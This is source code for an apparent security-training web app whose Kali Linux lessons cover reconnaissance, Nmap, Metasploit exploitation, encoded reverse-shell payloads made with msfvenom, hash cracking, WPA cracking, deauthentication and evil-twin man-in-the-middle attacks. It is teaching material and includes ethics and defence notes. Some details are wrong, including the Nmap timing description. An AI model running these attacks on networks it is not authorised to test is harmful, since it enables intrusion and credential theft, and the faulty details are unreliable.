import React, { useState, useEffect } from 'react';
import { useParams, Link } from 'react-router-dom';
import { studyTopics } from '../data/studyTopics';
import { CheckCircle, Play, BookOpen, Trophy, ArrowLeft } from 'lucide-react';

const Lesson = () => {
  const { id } = useParams();
  const lesson = studyTopics.find(topic => topic.id === parseInt(id));
  const [activeTab, setActiveTab] = useState('study');
  const [completedTasks, setCompletedTasks] = useState(new Set());
  const [quizAnswers, setQuizAnswers] = useState({});
  const [quizSubmitted, setQuizSubmitted] = useState(false);
  const [quizScore, setQuizScore] = useState(0);

  if (!lesson) {
    return (
      <div className="min-h-screen bg-gray-900 text-white flex items-center justify-center">
        <div className="text-center">
          <h1 className="text-2xl font-bold mb-4">Lesson Not Found</h1>
          <Link to="/study" className="text-blue-400 hover:text-blue-300">
            Return to Study Library
          </Link>
        </div>
      </div>
    );
  }

  const studyContent = generateLessonContent(lesson);
  const tasks = generateTasks(lesson);
  const quiz = generateQuiz(lesson);

  const handleTaskToggle = (taskIndex) => {
    const newCompleted = new Set(completedTasks);
    if (newCompleted.has(taskIndex)) {
      newCompleted.delete(taskIndex);
    } else {
      newCompleted.add(taskIndex);
    }
    setCompletedTasks(newCompleted);
  };

  const handleQuizSubmit = () => {
    let score = 0;
    quiz.questions.forEach((question, index) => {
      if (quizAnswers[index] === question.correct) {
        score++;
      }
    });
    setQuizScore(score);
    setQuizSubmitted(true);
  };

  const resetQuiz = () => {
    setQuizAnswers({});
    setQuizSubmitted(false);
    setQuizScore(0);
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white">
      {/* Header */}
      <div className="bg-gray-800 border-b border-gray-700 p-4">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <Link to="/study" className="text-gray-400 hover:text-white">
              <ArrowLeft className="w-6 h-6" />
            </Link>
            <div>
              <h1 className="text-2xl font-bold">{lesson.title}</h1>
              <p className="text-gray-400">{lesson.category}</p>
            </div>
          </div>
          <div className="flex items-center space-x-2">
            <span className="px-3 py-1 bg-blue-600 rounded-full text-sm">
              Lesson {lesson.id}
            </span>
          </div>
        </div>
      </div>

      {/* Tab Navigation */}
      <div className="bg-gray-800 border-b border-gray-700">
        <div className="max-w-6xl mx-auto">
          <div className="flex">
            {[
              { id: 'study', label: 'Study Material', icon: BookOpen },
              { id: 'tasks', label: 'Practical Tasks', icon: Play },
              { id: 'quiz', label: 'Knowledge Quiz', icon: Trophy }
            ].map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center space-x-2 px-6 py-4 border-b-2 font-medium text-sm ${
                  activeTab === tab.id
                    ? 'border-blue-500 text-blue-400'
                    : 'border-transparent text-gray-400 hover:text-white'
                }`}
              >
                <tab.icon className="w-4 h-4" />
                <span>{tab.label}</span>
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Content */}
      <div className="max-w-6xl mx-auto p-6">
        {activeTab === 'study' && (
          <div className="space-y-6">
            <div className="bg-gray-800 rounded-lg p-6">
              <h2 className="text-xl font-bold mb-4">Estimated Time: {studyContent.estimatedTime} minutes</h2>
              {studyContent.sections.map((section, index) => (
                <div key={index} className="mb-6">
                  <h3 className="text-lg font-semibold mb-3 text-blue-400">{section.title}</h3>
                  <p className="text-gray-300 mb-3">{section.content}</p>
                  {section.list && (
                    <ul className="list-disc list-inside space-y-1 text-gray-300 mb-3">
                      {section.list.map((item, i) => (
                        <li key={i}>{item}</li>
                      ))}
                    </ul>
                  )}
                  {section.code && (
                    <pre className="bg-gray-900 p-4 rounded border text-green-400 overflow-x-auto">
                      <code>{section.code}</code>
                    </pre>
                  )}
                </div>
              ))}
            </div>
          </div>
        )}

        {activeTab === 'tasks' && (
          <div className="space-y-4">
            <h2 className="text-xl font-bold mb-4">Practical Tasks</h2>
            {tasks.map((task, index) => (
              <div key={index} className="bg-gray-800 rounded-lg p-6">
                <div className="flex items-start space-x-4">
                  <button
                    onClick={() => handleTaskToggle(index)}
                    className={`w-6 h-6 rounded border-2 flex items-center justify-center ${
                      completedTasks.has(index)
                        ? 'bg-green-600 border-green-600'
                        : 'border-gray-600 hover:border-gray-500'
                    }`}
                  >
                    {completedTasks.has(index) && <CheckCircle className="w-4 h-4 text-white" />}
                  </button>
                  <div className="flex-1">
                    <h3 className={`font-semibold ${completedTasks.has(index) ? 'line-through text-gray-500' : ''}`}>
                      {task.title}
                    </h3>
                    <p className={`text-gray-300 mt-1 ${completedTasks.has(index) ? 'line-through text-gray-500' : ''}`}>
                      {task.description}
                    </p>
                    {task.commands && (
                      <pre className="bg-gray-900 p-3 rounded border text-green-400 mt-3 overflow-x-auto">
                        <code>{task.commands}</code>
                      </pre>
                    )}
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="space-y-6">
            <h2 className="text-xl font-bold mb-4">Knowledge Assessment</h2>

            {!quizSubmitted ? (
              <div className="space-y-6">
                {quiz.questions.map((question, index) => (
                  <div key={index} className="bg-gray-800 rounded-lg p-6">
                    <h3 className="font-semibold mb-4">{index + 1}. {question.question}</h3>
                    <div className="space-y-2">
                      {question.options.map((option, optionIndex) => (
                        <label key={optionIndex} className="flex items-center space-x-3">
                          <input
                            type="radio"
                            name={`question-${index}`}
                            value={optionIndex}
                            checked={quizAnswers[index] === optionIndex}
                            onChange={() => setQuizAnswers({...quizAnswers, [index]: optionIndex})}
                            className="text-blue-600"
                          />
                          <span className="text-gray-300">{option}</span>
                        </label>
                      ))}
                    </div>
                  </div>
                ))}
                <button
                  onClick={handleQuizSubmit}
                  className="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg font-semibold"
                >
                  Submit Quiz
                </button>
              </div>
            ) : (
              <div className="bg-gray-800 rounded-lg p-6">
                <h3 className="text-xl font-bold mb-4">Quiz Results</h3>
                <div className="text-center mb-6">
                  <div className="text-4xl font-bold text-blue-400 mb-2">
                    {quizScore}/{quiz.questions.length}
                  </div>
                  <div className="text-gray-400">
                    {Math.round((quizScore / quiz.questions.length) * 100)}% Correct
                  </div>
                </div>

                <div className="space-y-4">
                  {quiz.questions.map((question, index) => (
                    <div key={index} className={`p-4 rounded ${
                      quizAnswers[index] === question.correct ? 'bg-green-900' : 'bg-red-900'
                    }`}>
                      <h4 className="font-semibold mb-2">{question.question}</h4>
                      <p className="text-sm text-gray-300 mb-2">
                        Your answer: {question.options[quizAnswers[index]]}
                      </p>
                      <p className="text-sm text-green-400">
                        Correct answer: {question.options[question.correct]}
                      </p>
                      {question.explanation && (
                        <p className="text-sm text-gray-400 mt-2">{question.explanation}</p>
                      )}
                    </div>
                  ))}
                </div>

                <button
                  onClick={resetQuiz}
                  className="mt-6 bg-gray-600 hover:bg-gray-700 px-6 py-3 rounded-lg font-semibold"
                >
                  Retake Quiz
                </button>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

function generateLessonContent(lesson) {
  const contentMap = {
    'Kali Linux Fundamentals': {
      estimatedTime: 25,
      sections: [
        {
          title: 'What is Kali Linux?',
          content: 'Kali Linux is a Debian-based Linux distribution designed for digital forensics and penetration testing. It comes pre-installed with hundreds of security tools and is maintained by Offensive Security.',
          list: [
            'Debian-based Linux distribution',
            'Pre-installed security tools',
            'Regular updates and new tool releases',
            'Multiple desktop environments',
            'Live USB boot capability'
          ]
        },
        {
          title: 'Kali Linux Editions',
          content: 'Kali Linux comes in different editions for various use cases and hardware configurations.',
          list: [
            'Kali Linux (standard edition)',
            'Kali Linux Light (minimal installation)',
            'Kali Linux NetHunter (for Android devices)',
            'Kali Linux WSL (Windows Subsystem for Linux)',
            'Kali Linux Docker images'
          ]
        },
        {
          title: 'System Requirements',
          content: 'Minimum and recommended hardware requirements for running Kali Linux.',
          code: `# Minimum Requirements:
# - 20 GB disk space
# - 2 GB RAM
# - x64 processor
# - Bootable USB drive or DVD

# Recommended Requirements:
# - 50+ GB SSD storage
# - 4 GB RAM (8 GB preferred)
# - Multi-core processor
# - Dedicated graphics card (optional)`
        },
        {
          title: 'Kali Linux Philosophy',
          content: 'Understanding the principles and ethics behind Kali Linux usage.',
          list: [
            'Only for authorized testing',
            'Legal compliance mandatory',
            'Responsible disclosure',
            'Continuous learning',
            'Community contribution'
          ]
        }
      ]
    },
    'Kali Linux Command Line': {
      estimatedTime: 30,
      sections: [
        {
          title: 'Essential Command Line Tools',
          content: 'Core command-line utilities that every Kali user should master.',
          code: `# Navigation commands
pwd                    # Print working directory
ls -la                 # List files with details
cd /path/to/directory  # Change directory
mkdir new_folder       # Create directory
rmdir empty_folder     # Remove empty directory

# File operations
touch file.txt         # Create empty file
cp source.txt dest.txt # Copy file
mv old.txt new.txt     # Move/rename file
rm file.txt            # Remove file
cat file.txt           # Display file contents`
        },
        {
          title: 'Text Processing with Command Line',
          content: 'Powerful text processing tools available in Kali Linux.',
          code: `# Text manipulation
grep "pattern" file.txt     # Search for patterns
sed 's/old/new/g' file.txt  # Stream editor
awk '{print $1}' file.txt   # Pattern scanning
sort file.txt               # Sort lines
uniq file.txt               # Remove duplicates
wc -l file.txt              # Count lines

# Advanced text processing
cut -d',' -f1 file.csv      # Extract columns
paste file1.txt file2.txt   # Merge files
diff file1.txt file2.txt    # Compare files
comm file1.txt file2.txt    # Compare sorted files`
        },
        {
          title: 'Process Management',
          content: 'Managing running processes and system resources.',
          code: `# Process commands
ps aux                    # List all processes
top                       # Interactive process viewer
htop                      # Enhanced process viewer
kill 1234                 # Kill process by PID
killall firefox           # Kill by name
nice -n 10 command        # Set process priority
renice -n 5 -p 1234       # Change priority

# Background processes
command &                 # Run in background
jobs                      # List background jobs
fg %1                     # Bring job to foreground
bg %1                     # Resume in background`
        },
        {
          title: 'System Information',
          content: 'Gathering system information and hardware details.',
          code: `# System information
uname -a                  # System details
lsb_release -a            # Distribution info
df -h                     # Disk usage
du -sh /directory         # Directory size
free -h                   # Memory usage
lscpu                     # CPU information
lspci                     # PCI devices
lsusb                     # USB devices
ifconfig                  # Network interfaces
ip addr show              # IP addresses`
        }
      ]
    },
    'Information Gathering with Kali': {
      estimatedTime: 35,
      sections: [
        {
          title: 'Passive Reconnaissance',
          content: 'Gathering information without directly interacting with the target system.',
          list: [
            'WHOIS lookups',
            'DNS enumeration',
            'Public records search',
            'Social media analysis',
            'Job posting analysis',
            'Public document analysis'
          ]
        },
        {
          title: 'OSINT Tools in Kali',
          content: 'Open Source Intelligence tools available in Kali Linux.',
          code: `# WHOIS information
whois domain.com

# DNS enumeration
dig domain.com ANY
dnsrecon -d domain.com

# Subdomain enumeration
sublist3r -d domain.com
amass enum -d domain.com

# Email harvesting
theHarvester -d domain.com -l 500 -b all

# Social media search
maltego                    # Visual OSINT tool`
        },
        {
          title: 'Web Intelligence Gathering',
          content: 'Extracting information from web sources and public websites.',
          code: `# Web technology detection
whatweb http://target.com

# Directory enumeration
dirb http://target.com /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Web crawling
wget --mirror -p --convert-links -P ./target http://target.com
httrack http://target.com

# Certificate analysis
openssl s_client -connect target.com:443 | openssl x509 -noout -text`
        },
        {
          title: 'Shodan and Internet Search',
          content: 'Using search engines and specialized databases for reconnaissance.',
          code: `# Shodan CLI (requires API key)
shodan search "port:22 country:US"
shodan host 8.8.8.8

# Censys search
censys search "services.http.response.body:`admin`"

# Public vulnerability databases
searchsploit "wordpress 5.0"
exploitdb --search "apache"`
        }
      ]
    },
    'Network Scanning with Nmap': {
      estimatedTime: 40,
      sections: [
        {
          title: 'Nmap Basics',
          content: 'Introduction to Nmap, the most powerful network scanning tool available.',
          code: `# Basic host discovery
nmap 192.168.1.0/24

# Scan specific ports
nmap -p 1-100 target.com

# Service version detection
nmap -sV target.com

# OS fingerprinting
nmap -O target.com

# Aggressive scan (combines multiple techniques)
nmap -A target.com`
        },
        {
          title: 'Nmap Scan Types',
          content: 'Different types of scans for various reconnaissance needs.',
          code: `# TCP SYN scan (stealthy)
nmap -sS target.com

# TCP connect scan
nmap -sT target.com

# UDP scan
nmap -sU target.com

# Ping scan only
nmap -sn target.com

# Null scan (no flags)
nmap -sN target.com

# FIN scan
nmap -sF target.com

# Xmas scan
nmap -sX target.com`
        },
        {
          title: 'Advanced Nmap Features',
          content: 'Advanced scanning techniques and output options.',
          code: `# Timing options (0-5, higher = slower but stealthier)
nmap -T4 target.com

# Fragment packets
nmap -f target.com

# Decoy scanning
nmap -D RND:10 target.com

# Source port spoofing
nmap --source-port 53 target.com

# Output formats
nmap -oN output.txt target.com    # Normal
nmap -oX output.xml target.com    # XML
nmap -oG output.grep target.com   # Grepable`
        },
        {
          title: 'Nmap Scripting Engine',
          content: 'Using NSE scripts for advanced scanning and vulnerability detection.',
          code: `# List available scripts
ls /usr/share/nmap/scripts/

# Vulnerability scanning
nmap --script vuln target.com

# Service-specific scripts
nmap --script http-enum target.com
nmap --script smb-enum-shares target.com

# Custom script execution
nmap --script /path/to/script.nse target.com

# Script categories
nmap --script "discovery" target.com
nmap --script "safe" target.com`
        }
      ]
    },
    'Metasploit Framework Basics': {
      estimatedTime: 45,
      sections: [
        {
          title: 'What is Metasploit?',
          content: 'Metasploit Framework is the world\'s most used penetration testing framework. It provides tools for developing, testing, and executing exploits.',
          list: [
            'Exploit development and testing',
            'Payload generation',
            'Post-exploitation modules',
            'Auxiliary modules',
            'Comprehensive exploit database'
          ]
        },
        {
          title: 'Starting Metasploit',
          content: 'Launching Metasploit and understanding the interface.',
          code: `# Start Metasploit
msfconsole

# Alternative ways
msf6                    # Newer version
./msfconsole           # From source

# Database setup (important)
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb start`
        },
        {
          title: 'Metasploit Modules',
          content: 'Understanding the different types of modules in Metasploit.',
          code: `# List all modules
show all

# Search for modules
search eternalblue
search type:exploit platform:windows

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# Show module options
show options

# Set options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444`
        },
        {
          title: 'Basic Exploitation',
          content: 'Step-by-step process of using Metasploit for exploitation.',
          code: `# 1. Select exploit
use exploit/multi/http/struts2_content_type_ognl

# 2. Configure options
set RHOSTS target.com
set TARGETURI /struts2-showcase/showcase.action
set LHOST your_ip
set LPORT 4444

# 3. Check if target is vulnerable
check

# 4. Run the exploit
exploit

# 5. Interact with session
sessions -i 1
sysinfo
getuid`
        },
        {
          title: 'Payloads and Encoders',
          content: 'Understanding payloads and how to encode them to evade detection.',
          code: `# List payloads
show payloads

# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# List encoders
show encoders

# Use encoder
set ENCODER x86/shikata_ga_nai
set ENCODERITERATIONS 3

# Generate standalone payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > payload.exe`
        }
      ]
    },
    'Password Cracking': {
      estimatedTime: 35,
      sections: [
        {
          title: 'Password Cracking Fundamentals',
          content: 'Understanding different password cracking techniques and their applications.',
          list: [
            'Dictionary attacks',
            'Brute force attacks',
            'Rainbow table attacks',
            'Hybrid attacks',
            'Password policy analysis'
          ]
        },
        {
          title: 'Hashcat Basics',
          content: 'Hashcat is the world\'s fastest password cracker, supporting multiple algorithms.',
          code: `# Basic syntax
hashcat -m [hash_type] -a [attack_mode] [hash_file] [wordlist]

# Common hash types
0 = MD5
100 = SHA1
1400 = SHA256
1800 = sha512crypt $6$
2100 = DCC2
3000 = LM

# Attack modes
0 = Straight (dictionary)
1 = Combination
3 = Brute-force
6 = Hybrid wordlist + mask
7 = Hybrid mask + wordlist`
        },
        {
          title: 'Dictionary Attacks',
          content: 'Using wordlists and dictionaries for password cracking.',
          code: `# RockYou wordlist (common passwords)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Custom wordlist
hashcat -m 0 -a 0 hashes.txt custom_wordlist.txt

# With rules (mutations)
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Multiple wordlists
hashcat -m 0 -a 0 hashes.txt wordlist1.txt wordlist2.txt`
        },
        {
          title: 'Brute Force Attacks',
          content: 'Systematic password cracking using all possible combinations.',
          code: `# Simple brute force (short passwords only)
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a

# Mask notation:
# ?l = lowercase letters
# ?u = uppercase letters
# ?d = digits
# ?s = special characters
# ?a = all characters

# Complex mask
hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?l?d?d?s

# Incremental mode
hashcat -m 0 -a 3 hashes.txt --increment --increment-min 1 --increment-max 8 ?a?a?a?a?a?a?a?a`
        },
        {
          title: 'Rainbow Tables',
          content: 'Pre-computed hash tables for fast password cracking.',
          code: `# Generate rainbow table
rtgen md5 loweralpha-numeric 1 7 0 3800 1600

# Sort rainbow table
rtsort rainbow_table.rt

# Crack with rainbow table
rcrack rainbow_table.rt -f hash_file.txt

# Ophcrack (GUI rainbow table cracker)
ophcrack -g -d /path/to/tables -t hash_file.txt`
        },
        {
          title: 'John the Ripper',
          content: 'Another powerful password cracking tool with different approaches.',
          code: `# Basic usage
john hashes.txt

# With wordlist
john --wordlist=wordlist.txt hashes.txt

# Incremental mode
john --incremental hashes.txt

# Show cracked passwords
john --show hashes.txt

# Single crack mode (smart mutations)
john --single hashes.txt

# External mode (custom rules)
john --external:custom hashes.txt`
        }
      ]
    },
    'Wireless Network Attacks': {
      estimatedTime: 40,
      sections: [
        {
          title: 'Wireless Fundamentals',
          content: 'Understanding wireless network technologies and security protocols.',
          list: [
            '802.11 standards (a/b/g/n/ac/ax)',
            'WEP, WPA, WPA2, WPA3 encryption',
            'Wireless authentication methods',
            'Wireless network components',
            'Common wireless vulnerabilities'
          ]
        },
        {
          title: 'Aircrack-ng Suite',
          content: 'Complete suite of wireless network auditing tools.',
          code: `# 1. Put interface in monitor mode
sudo airmon-ng start wlan0

# 2. Scan for wireless networks
sudo airodump-ng mon0

# 3. Capture handshake
sudo airodump-ng -c [channel] --bssid [BSSID] -w capture mon0

# 4. Deauthenticate client to capture handshake
sudo aireplay-ng -0 1 -a [BSSID] -c [CLIENT_MAC] mon0

# 5. Crack WPA handshake
aircrack-ng -w wordlist.txt capture-01.cap`
        },
        {
          title: 'WEP Cracking',
          content: 'Cracking WEP encryption (obsolete but still found in some networks).',
          code: `# Start monitor mode
airmon-ng start wlan0

# Scan for WEP networks
airodump-ng mon0

# Capture IVs
airodump-ng -c [channel] --bssid [BSSID] -w wep_capture mon0

# Fake authentication
aireplay-ng -1 0 -e [ESSID] -a [BSSID] -h [YOUR_MAC] mon0

# ARP replay attack to generate IVs
aireplay-ng -3 -b [BSSID] -h [YOUR_MAC] mon0

# Crack WEP key
aircrack-ng -b [BSSID] wep_capture-01.cap`
        },
        {
          title: 'WPA2 Cracking',
          content: 'Cracking WPA2-PSK networks using various methods.',
          code: `# PMKID attack (fast, no clients needed)
hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1
hcxpcaptool -z pmkid_hash capture.pcapng
hashcat -m 16800 pmkid_hash wordlist.txt

# Traditional 4-way handshake
airodump-ng -c [channel] --bssid [BSSID] -w capture mon0
aireplay-ng -0 5 -a [BSSID] -c [CLIENT] mon0
aircrack-ng -w wordlist.txt capture-01.cap

# GPU acceleration with hashcat
wpaclean clean_capture.cap capture-01.cap
aircrack-ng clean_capture.cap -J hash
hccap2john hash.hccap > hash.john
john --fork=4 --format=wpapsk hash.john`
        },
        {
          title: 'Evil Twin Attacks',
          content: 'Creating rogue access points to intercept wireless traffic.',
          code: `# Create evil twin
airbase-ng -e "Free WiFi" -c 6 mon0

# Bridge interfaces
brctl addbr evil
brctl addif evil at0
brctl addif evil eth0
ifconfig evil up

# DHCP server
dnsmasq -C dnsmasq.conf -d

# SSL stripping (sslstrip)
sslstrip -l 8080

# ettercap for MITM
ettercap -T -q -i evil`
        },
        {
          title: 'Wireless Defense',
          content: 'Protecting wireless networks from attacks.',
          list: [
            'Use WPA3 encryption',
            'Disable WPS',
            'Use strong passwords',
            'Monitor for rogue APs',
            'Implement MAC filtering',
            'Regular security audits',
            'Use enterprise authentication'
          ]
        }
      ]
    }
  };

  return contentMap[lesson.title] || {
    estimatedTime: 20,
    sections: [
      {
        title: 'Overview',
        content: lesson.content,
        list: [
          'Study the core concepts presented',
          'Understand the practical applications',
          'Review real-world examples',
          'Practice with hands-on exercises'
        ]
      },
      {
        title: 'Key Concepts',
        content: 'This lesson covers fundamental principles and best practices in the field.',
        list: [
          'Theoretical foundations',
          'Practical implementation',
          'Common pitfalls to avoid',
          'Industry standards and guidelines'
        ]
      }
    ]
  };
}

function generateTasks(lesson) {
  const taskMap = {
    'Kali Linux Fundamentals': [
      {
        title: 'Download Kali ISO',
        description: 'Download the latest Kali Linux ISO from the official website.',
        commands: 'wget https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-installer-amd64.iso'
      },
      {
        title: 'Verify ISO Integrity',
        description: 'Verify the downloaded ISO using SHA256 checksum.',
        commands: `wget https://cdimage.kali.org/kali-2024.1/SHA256SUMS
sha256sum -c SHA256SUMS --ignore-missing`
      },
      {
        title: 'Create Bootable USB',
        description: 'Create a bootable USB drive using Rufus or dd command.',
        commands: 'sudo dd if=kali-linux.iso of=/dev/sdb bs=4M status=progress'
      },
      {
        title: 'Explore Kali Menu',
        description: 'Explore the Kali Linux application menu and available tools.',
        commands: `ls /usr/share/kali-menu
kali-tweaks`
      }
    ],
    'Kali Linux Command Line': [
      {
        title: 'Basic Navigation',
        description: 'Practice basic file system navigation and file operations.',
        commands: `pwd
ls -la
cd /usr/share
mkdir test_directory
touch test_file.txt
cp test_file.txt backup.txt
rm test_file.txt`
      },
      {
        title: 'Package Management',
        description: 'Learn to install, update, and remove packages using apt.',
        commands: `sudo apt update
sudo apt search nmap
sudo apt show nmap
sudo apt install -y nmap`
      },
      {
        title: 'Text Processing',
        description: 'Learn to process and analyze text files using command-line tools.',
        commands: `echo "Hello World" > test.txt
cat test.txt
grep "Hello" test.txt
wc test.txt
sort test.txt`
      },
      {
        title: 'Process Management',
        description: 'Practice managing running processes and system resources.',
        commands: `ps aux | head -10
top -n 1
kill -9 [PID]
nice -n 10 sleep 100 &`
      }
    ],
    'Information Gathering with Kali': [
      {
        title: 'WHOIS Lookup',
        description: 'Perform WHOIS lookups on domains to gather registration information.',
        commands: `whois google.com
whois -h whois.arin.net 8.8.8.8`
      },
      {
        title: 'DNS Enumeration',
        description: 'Practice DNS enumeration techniques on permitted domains.',
        commands: `nslookup google.com
dig google.com ANY
host -t mx google.com`
      },
      {
        title: 'Web Technology Detection',
        description: 'Use tools to identify web server technologies and frameworks.',
        commands: `whatweb http://httpbin.org
curl -I http://httpbin.org`
      },
      {
        title: 'Directory Enumeration',
        description: 'Discover hidden directories and files on web servers.',
        commands: `dirb http://httpbin.org /usr/share/wordlists/dirb/small.txt
gobuster dir -u http://httpbin.org -w /usr/share/wordlists/dirb/common.txt`
      }
    ],
    'Network Scanning with Nmap': [
      {
        title: 'Basic Host Discovery',
        description: 'Discover live hosts on your local network.',
        commands: `nmap -sn 192.168.1.0/24
arp -a`
      },
      {
        title: 'Service Detection',
        description: 'Identify running services and their versions on target systems.',
        commands: `nmap -sV localhost
nmap -sV --version-intensity 5 localhost`
      },
      {
        title: 'Port Scanning',
        description: 'Scan for open ports on target systems.',
        commands: `nmap -p 1-1000 localhost
nmap -p- localhost`
      },
      {
        title: 'OS Fingerprinting',
        description: 'Determine the operating system of target systems.',
        commands: `nmap -O localhost
nmap -O --osscan-guess localhost`
      },
      {
        title: 'Vulnerability Scanning',
        description: 'Use Nmap scripts to detect common vulnerabilities.',
        commands: `nmap --script vuln localhost
nmap --script "http-* and safe" localhost`
      }
    ],
    'Metasploit Framework Basics': [
      {
        title: 'Setup Metasploit Database',
        description: 'Initialize and start the Metasploit database.',
        commands: `sudo systemctl start postgresql
sudo msfdb init
sudo msfdb start`
      },
      {
        title: 'Launch Metasploit',
        description: 'Start the Metasploit console and explore basic commands.',
        commands: `msfconsole
help
version
db_status`
      },
      {
        title: 'Search and Use Modules',
        description: 'Search for and use Metasploit modules.',
        commands: `search heartbleed
use auxiliary/scanner/http/ssl_heartbleed
show options`
      },
      {
        title: 'Generate Payload',
        description: 'Create a simple payload using msfvenom.',
        commands: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > test.exe
file test.exe`
      }
    ],
    'Password Cracking': [
      {
        title: 'Create Test Hashes',
        description: 'Create sample password hashes for testing.',
        commands: `echo -n "password" | md5sum
echo -n "password" | sha256sum
openssl passwd -1 "password"`
      },
      {
        title: 'Dictionary Attack',
        description: 'Perform a dictionary attack using a small wordlist.',
        commands: `echo "password" > test_hash.txt
hashcat -m 0 -a 0 test_hash.txt /usr/share/wordlists/rockyou.txt --force`
      },
      {
        title: 'Brute Force Attack',
        description: 'Attempt a brute force attack on a simple hash.',
        commands: `hashcat -m 0 -a 3 simple_hash.txt ?l?l?l?l --force`
      },
      {
        title: 'Password Policy Analysis',
        description: 'Analyze password strength and common patterns.',
        commands: `# Use tools like john or hashcat to analyze password patterns
# Study common password patterns and weak passwords`
      }
    ],
    'Wireless Network Attacks': [
      {
        title: 'Monitor Mode Setup',
        description: 'Put wireless interface into monitor mode.',
        commands: `sudo airmon-ng check kill
sudo airmon-ng start wlan0
iwconfig`
      },
      {
        title: 'Network Scanning',
        description: 'Scan for available wireless networks.',
        commands: `sudo airodump-ng mon0
sudo wash -i mon0`
      },
      {
        title: 'Capture Handshake',
        description: 'Capture WPA handshake from a wireless network.',
        commands: `sudo airodump-ng -c [channel] --bssid [BSSID] -w capture mon0
sudo aireplay-ng -0 1 -a [BSSID] -c [CLIENT_MAC] mon0`
      },
      {
        title: 'Analyze Wireless Traffic',
        description: 'Use Wireshark to analyze wireless network traffic.',
        commands: `sudo wireshark
# Capture on wlan0 interface
# Filter for wireless management frames`
      }
    ]
  };

  return taskMap[lesson.title] || [
    {
      title: 'Study Materials',
      description: 'Read through all the study materials provided in this lesson.',
      commands: null
    },
    {
      title: 'Take Notes',
      description: 'Take detailed notes on key concepts and important points.',
      commands: null
    },
    {
      title: 'Practice Concepts',
      description: 'Apply the concepts learned to a practical scenario.',
      commands: null
    },
    {
      title: 'Research Further',
      description: 'Research additional resources related to this topic.',
      commands: null
    }
  ];
}

function generateQuiz(lesson) {
  const quizMap = {
    'Kali Linux Fundamentals': {
      questions: [
        {
          question: 'What is Kali Linux primarily designed for?',
          options: ['General desktop computing', 'Penetration testing and security research', 'Web development', 'Gaming'],
          correct: 1,
          explanation: 'Kali Linux is specifically designed for penetration testing, security research, digital forensics, and ethical hacking.'
        },
        {
          question: 'Which package manager does Kali Linux use?',
          options: ['yum', 'apt', 'pacman', 'zypper'],
          correct: 1,
          explanation: 'Kali Linux uses the apt package manager, inherited from its Debian base.'
        },
        {
          question: 'What is the minimum RAM requirement for Kali Linux?',
          options: ['512 MB', '1 GB', '2 GB', '4 GB'],
          correct: 2,
          explanation: 'Kali Linux requires a minimum of 2 GB RAM, though 4 GB or more is recommended for better performance.'
        },
        {
          question: 'Which of these is NOT a Kali Linux edition?',
          options: ['Kali Linux Light', 'Kali Linux NetHunter', 'Kali Linux Gaming', 'Kali Linux WSL'],
          correct: 2,
          explanation: 'Kali Linux Gaming is not an official edition. The others (Light, NetHunter, WSL) are legitimate Kali editions.'
        },
        {
          question: 'What should you do before using Kali Linux for penetration testing?',
          options: ['Start hacking immediately', 'Obtain written permission', 'Install games', 'Connect to public WiFi'],
          correct: 1,
          explanation: 'Always obtain written permission before performing any penetration testing or security assessments.'
        }
      ]
    },
    'Kali Linux Command Line': {
      questions: [
        {
          question: 'Which command shows your current directory?',
          options: ['ls', 'cd', 'pwd', 'mkdir'],
          correct: 2,
          explanation: 'pwd (print working directory) displays the current directory path.'
        },
        {
          question: 'What does the -la flag do with the ls command?',
          options: ['Shows only directories', 'Shows all files including hidden ones in long format', 'Lists files alphabetically', 'Shows file sizes only'],
          correct: 1,
          explanation: '-l shows long format (detailed info) and -a shows all files including hidden ones (starting with .).'
        },
        {
          question: 'Which command is used to install packages in Kali?',
          options: ['sudo apt install', 'sudo yum install', 'sudo pacman -S', 'sudo brew install'],
          correct: 0,
          explanation: 'Kali Linux uses apt package manager, so sudo apt install is the correct command for installing packages.'
        },
        {
          question: 'What does the grep command do?',
          options: ['Creates files', 'Searches for text patterns in files', 'Lists directories', 'Changes permissions'],
          correct: 1,
          explanation: 'grep searches for specific text patterns within files or input streams.'
        },
        {
          question: 'Which command shows network interface information?',
          options: ['ifconfig', 'ip addr show', 'Both are correct', 'netstat'],
          correct: 2,
          explanation: 'Both ifconfig and ip addr show display network interface information, though ip is the modern replacement for ifconfig.'
        }
      ]
    },
    'Information Gathering with Kali': {
      questions: [
        {
          question: 'What does OSINT stand for?',
          options: ['Open Source Intelligence', 'Operating System Integration Tool', 'Online Security Information Network', 'Open System Internet Tools'],
          correct: 0,
          explanation: 'OSINT stands for Open Source Intelligence, referring to information gathered from publicly available sources.'
        },
        {
          question: 'Which tool is used for DNS enumeration?',
          options: ['nmap', 'dig', 'wireshark', 'burp suite'],
          correct: 1,
          explanation: 'dig (Domain Information Groper) is a DNS lookup utility used for DNS enumeration and querying DNS servers.'
        },
        {
          question: 'What is the purpose of theHarvester?',
          options: ['Password cracking', 'Email harvesting and OSINT', 'Network scanning', 'Web exploitation'],
          correct: 1,
          explanation: 'theHarvester is an OSINT tool used for gathering emails, names, subdomains, IPs, and URLs from public sources.'
        },
        {
          question: 'Which command performs a WHOIS lookup?',
          options: ['whois domain.com', 'dig domain.com', 'nslookup domain.com', 'host domain.com'],
          correct: 0,
